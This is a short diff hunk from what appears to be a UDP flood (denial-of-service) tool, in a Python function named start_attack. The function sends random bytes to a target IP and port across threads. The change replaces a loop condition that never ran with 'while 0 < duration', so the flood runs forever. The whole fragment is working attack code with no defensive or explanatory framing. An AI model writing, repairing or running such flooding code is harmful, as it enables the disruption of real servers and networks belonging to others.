@@ -50,7 +50,8 @@ def start_attack():
         if remaining_bytes > 0:
             s.sendto(random._urandom(remaining_bytes), (target_ip, int(target_port)))
         s.close()
-    while t.time() - t.time() < duration:
+        
+    while 0 < duration:
         for _ in range(int(data.get('threads', 10))):
             for _ in range(int(num_attacks)):
                 attack()
